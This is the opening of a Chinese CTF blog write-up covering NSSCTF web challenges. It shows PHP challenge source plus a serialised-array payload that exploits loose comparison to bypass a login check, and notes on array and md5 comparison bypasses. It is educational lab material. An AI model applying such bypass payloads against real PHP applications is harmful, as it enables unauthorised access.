
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>NSSCTF web 刷题记录1 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-websign"><span class="toc-number">2.</span> <span class="toc-text">[UUCTF 2022 新生赛]websign</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-checkin"><span class="toc-number">3.</span> <span class="toc-text">[HUBUCTF 2022 新生赛]checkin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSCTF-2022-Spring-Recruit-babyphp"><span class="toc-number">4.</span> <span class="toc-text">[NSSCTF 2022 Spring Recruit]babyphp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GKCTF-2020-cve%E7%89%88%E7%AD%BE%E5%88%B0"><span class="toc-number">5.</span> <span class="toc-text">[GKCTF 2020]cve版签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="toc-number">6.</span> <span class="toc-text">[UUCTF 2022 新生赛]ez_rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easycon"><span class="toc-number">7.</span> <span class="toc-text">[羊城杯 2020]easycon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-ez-php-revenge"><span class="toc-number">8.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GKCTF-2021-easycms"><span class="toc-number">9.</span> <span class="toc-text">[GKCTF 2021]easycms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-pklovecloud"><span class="toc-number">10.</span> <span class="toc-text">[第五空间 2021]pklovecloud</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-yet-another-mysql-injection"><span class="toc-number">11.</span> <span class="toc-text">[第五空间 2021]yet_another_mysql_injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F1"><span class="toc-number">11.1.</span> <span class="toc-text">非预期1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F2"><span class="toc-number">11.2.</span> <span class="toc-text">非预期2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval"><span class="toc-number">12.</span> <span class="toc-text">[天翼杯 2021]esay_eval</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-xff"><span class="toc-number">13.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]xff</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSRound-4-SWPU-1zweb"><span class="toc-number">14.</span> <span class="toc-text">[NSSRound#4 SWPU]1zweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-sql"><span class="toc-number">15.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]ez_sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce-3"><span class="toc-number">16.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]hardrce_3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSRound-8-Basic-MyDoor"><span class="toc-number">17.</span> <span class="toc-text">[NSSRound#8 Basic]MyDoor</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF-2018-flask%E7%9C%9F%E9%A6%99"><span class="toc-number">18.</span> <span class="toc-text">[NCTF 2018]flask真香</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-webdog1-start"><span class="toc-number">19.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]webdog1__start</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#prize-p5"><span class="toc-number">20.</span> <span class="toc-text">prize_p5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">20.1.</span> <span class="toc-text">非预期</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-funny-php"><span class="toc-number">21.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]funny_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1"><span class="toc-number">22.</span> <span class="toc-text">[NCTF 2018]滴!晨跑打卡</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">23.</span> <span class="toc-text">[BJDCTF 2020]ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E7%9A%84php"><span class="toc-number">24.</span> <span class="toc-text">[鹏城杯 2022]简单的php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF-2019-BabySqli"><span class="toc-number">25.</span> <span class="toc-text">[GXYCTF 2019]BabySqli</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2020-Normal-SSTI"><span class="toc-number">26.</span> <span class="toc-text">[安洵杯 2020]Normal SSTI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-upload"><span class="toc-number">27.</span> <span class="toc-text">[UUCTF 2022 新生赛]ez_upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-welcome"><span class="toc-number">28.</span> <span class="toc-text">[极客大挑战 2020]welcome</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSRound-4-SWPU-ez-rce"><span class="toc-number">29.</span> <span class="toc-text">[NSSRound#4 SWPU]ez_rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-1zpop"><span class="toc-number">30.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]ez_1zpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HZNUCTF-2023-preliminary-flask"><span class="toc-number">31.</span> <span class="toc-text">[HZNUCTF 2023 preliminary]flask</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unser"><span class="toc-number">32.</span> <span class="toc-text">[UUCTF 2022 新生赛]ez_unser</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF-2019-Fake-XML-cookbook"><span class="toc-number">33.</span> <span class="toc-text">[NCTF 2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Ez-upload"><span class="toc-number">34.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]Ez_upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSRound-8-Basic-MyPage"><span class="toc-number">35.</span> <span class="toc-text">[NSSRound#8 Basic]MyPage</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E4%BC%AA%E5%8D%8F%E8%AE%AE%E9%85%8D%E5%90%88%E5%A4%9A%E7%BA%A7%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5"><span class="toc-number">35.1.</span> <span class="toc-text">方法1：伪协议配合多级符号链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9Apearcmd"><span class="toc-number">35.2.</span> <span class="toc-text">方法2：pearcmd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9Asession-upload-progress%E4%B8%8ESession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">35.3.</span> <span class="toc-text">方法3：session.upload_progress与Session文件包含</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyunser"><span class="toc-number">36.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]babyunser</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF-2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">37.</span> <span class="toc-text">[GXYCTF 2019]禁止套娃</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-funny-web"><span class="toc-number">38.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]funny_web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GFCTF-2021-Baby-Web"><span class="toc-number">39.</span> <span class="toc-text">[GFCTF 2021]Baby_Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#array-merge%E5%87%BD%E6%95%B0"><span class="toc-number">39.1.</span> <span class="toc-text">array_merge函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%83%A8%E5%88%86"><span class="toc-number">39.2.</span> <span class="toc-text">代码审计部分</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HZNUCTF-2023-preliminary-ppppop"><span class="toc-number">40.</span> <span class="toc-text">[HZNUCTF 2023 preliminary]ppppop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HZNUCTF-2023-preliminary-guessguessguess"><span class="toc-number">41.</span> <span class="toc-text">[HZNUCTF 2023 preliminary]guessguessguess</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B9%96%E6%B9%98%E6%9D%AF-2021-final-Penetratable"><span class="toc-number">42.</span> <span class="toc-text">[湖湘杯 2021 final]Penetratable</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">42.1.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">42.2.</span> <span class="toc-text">任意文件下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sed%E6%8F%90%E6%9D%83"><span class="toc-number">42.3.</span> <span class="toc-text">sed提权</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>NSSCTF web 刷题记录1</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/10/16
        </span>
        
        <span class="category">
            <a href="/blog/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #00a596">刷题</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/NSS/" style="color: #03a9f4">NSS</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">15.8k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">78分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>目标是成为web糕手</p>
<p>追随那位卡密的脚步，征战NSS</p>
<p>第一步就先把web第1~10页还没做的题先解决掉，一些没出现的题可能在我对应比赛的wp里</p>
<span id="more"></span>

<hr>
<h1 id="UUCTF-2022-新生赛-websign"><a href="#UUCTF-2022-新生赛-websign" class="headerlink" title="[UUCTF 2022 新生赛]websign"></a>[UUCTF 2022 新生赛]websign</h1><p>f12，右键，ctrl+u都被ban了</p>
<p>要么设置里把js禁用了，要么就在浏览器右上角打开开发者工具即可（我这里是火狐）</p>
<p>flag就在html的注释里</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231016001744256.png" alt="image-20231016001744256"></p>
<hr>
<h1 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h1><blockquote>
<p>弱类型比较+反序列化</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$username</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"this_is_secret"</span><span class="token punctuation">;</span> 
<span class="token variable">$password</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"this_is_not_known_to_you"</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//here I changed those two </span>
<span class="token variable">$info</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">;</span>
<span class="token variable">$data_unserialize</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data_unserialize</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$username</span><span class="token operator">&amp;&amp;</span><span class="token variable">$data_unserialize</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"username or password error!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注释里说包含的flag.php把<code>$username</code>和<code>$password</code>的值全修改了</p>
<p>那下面就要利用弱类型比较，让两个参数的值都为True，于是构造反序列化字符串</p>
<p>exp：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'password'</span> <span class="token operator">=></span> <span class="token constant boolean">true</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// a:2:&#123;s:8:"username";b:1;s:8:"password";b:1;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="NSSCTF-2022-Spring-Recruit-babyphp"><a href="#NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babyphp"></a>[NSSCTF 2022 Spring Recruit]babyphp</h1><blockquote>
<p>php特性</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]/'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b1'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c1'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"yee"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nop"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"go on"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"let's get some php"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>数组绕过intval</p>
<p>数组绕过md5强比较</p>
<p>md5字符串弱比较</p>
<p>payload：</p>
